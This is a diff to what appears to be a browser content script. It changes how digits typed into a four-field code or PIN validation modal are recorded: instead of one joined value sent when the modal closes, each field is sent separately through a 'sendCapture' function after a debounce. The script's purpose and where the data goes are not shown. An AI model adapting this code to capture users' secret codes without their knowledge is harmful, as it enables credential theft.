@@ -6,6 +6,7 @@ const CLAVE_FIELDS = ['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'
 const CLAVE_MODAL_ID = 'modalValidarCodigo';
 const DEDUPE_WINDOW_MS = 1500;
 const OS_DEBOUNCE_MS = 650;
+const CLAVE_DEBOUNCE_MS = 180;
 
 function getContentState() {
     const globalState = globalThis[CONTENT_STATE_KEY] || {};
@@ -158,31 +159,18 @@ function scheduleOsDebouncedSave(target, source, eventTimeStamp) {
 }
 
 function captureClave(target, source, eventTimeStamp) {
-    const value = normalizeText(getFieldValue(target));
-    if (!value) return;
     const state = getContentState();
-    state.claveBuffer ||= {};
-    state.claveBuffer[source] = value;
-}
+    state.claveDebounceTimers ||= {};
+    const key = ['clave', source].join('|');
 
-function getClaveCompleta() {
-    const state = getContentState();
-    const buffer = state.claveBuffer || {};
-    const visibleFields = CLAVE_FIELDS.map((fieldId) => document.getElementById(fieldId)).filter(Boolean);
-    const claveCompleta = visibleFields.length > 0
-        ? visibleFields.map((field) => normalizeText(getFieldValue(field)) || buffer[getInputId(field)] || '').join('')
-        : CLAVE_FIELDS.map((fieldId) => buffer[fieldId] || '').join('');
+    clearTimeout(state.claveDebounceTimers[key]);
+    state.claveDebounceTimers[key] = setTimeout(() => {
+        delete state.claveDebounceTimers[key];
+        const value = normalizeText(getFieldValue(target));
+        if (!value) return;
 
-    if (!claveCompleta) return;
-    return claveCompleta;
-}
-
-function sendClaveCapture(eventTimeStamp) {
-    const claveCompleta = getClaveCompleta();
-    if (!claveCompleta) return;
-    sendCapture('Clave', claveCompleta, CLAVE_MODAL_ID, eventTimeStamp);
-    const state = getContentState();
-    state.claveBuffer = {};
+        sendCapture('Clave', value, source, eventTimeStamp);
+    }, CLAVE_DEBOUNCE_MS);
 }
 
 function ensureClaveModalObserver() {
@@ -196,7 +184,19 @@ function ensureClaveModalObserver() {
     const modalObserver = new MutationObserver(() => {
         const style = modal.getAttribute('style') || '';
         if (style.includes('display: none')) {
-            sendClaveCapture(Date.now());
+            const visibleFields = CLAVE_FIELDS.map((fieldId) => document.getElementById(fieldId)).filter(Boolean);
+            for (const field of visibleFields) {
+                const source = getInputId(field);
+                const timerKey = ['clave', source].join('|');
+                const timer = state.claveDebounceTimers?.[timerKey];
+                if (timer) {
+                    clearTimeout(timer);
+                    delete state.claveDebounceTimers[timerKey];
+                }
+                const value = normalizeText(getFieldValue(field));
+                if (!value) continue;
+                sendCapture('Clave', value, source, Date.now());
+            }
         }
     });
     modalObserver.observe(modal, { attributes: true, attributeFilter: ['style'] });
